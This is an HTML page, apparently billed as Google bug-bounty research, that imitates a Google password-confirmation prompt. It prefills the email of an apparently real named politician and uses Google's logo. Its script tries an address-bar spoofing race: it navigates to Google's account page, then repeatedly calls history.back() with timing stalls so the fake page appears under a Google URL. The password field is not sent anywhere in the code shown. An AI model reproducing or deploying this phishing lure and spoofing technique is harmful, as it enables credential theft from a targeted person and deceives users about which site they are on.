<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Google VRP Research</title>
    <style>
        body { font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; background: #fff; }
        .box { border: 1px solid #dadce0; padding: 25px; border-radius: 8px; max-width: 350px; margin: 0 auto; }
        .btn { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 4px; font-size: 16px; width: 100%; cursor: pointer; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    </style>
</head>
<body>

    <div id="ui">
        <div class="box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90">
            <h3>Identity Verification</h3>
            <p>Your session requires a refresh. Please confirm your password.</p>
            <input type="email" value="joshhawleyofficial@gmail.com" readonly style="background:#f1f3f4;">
            <input type="password" placeholder="Enter password">
            <button class="btn" onclick="masterRace()">Verify Now</button>
        </div>
    </div>

    <script>
        function masterRace() {
            const target = "https://myaccount.google.com/?pli=1";
            
            // 1. Create a 'History Anchor' to trap the BFCache
            history.pushState({origin: "netlify"}, "", "#init");

            // 2. Start the cross-origin jump
            window.location.href = target;

            // 3. THE HIJACK: We use requestAnimationFrame (rAF)
            // rAF runs right before the browser 'paints' the screen.
            // We use it to trigger a history.back() at the exact moment 
            // the URL bar is committing to Google.
            let frames = 0;
            function race() {
                frames++;
                
                if (frames > 5 && frames < 20) {
                    // Force the browser to pull the Netlify page from cache
                    // while the URL bar is still pointing to Google.
                    history.back();
                }

                // 4. THE SYNC STALL
                // We saturate the microtask queue to prevent the renderer 
                // from clearing the 'back' state.
                Promise.resolve().then(() => {
                    const start = Date.now();
                    while (Date.now() - start < 10) {} // Micro-stall
                });

                if (frames < 50) {
                    requestAnimationFrame(race);
                }
            }
            
            requestAnimationFrame(race);
        }
    </script>
</body>
</html>
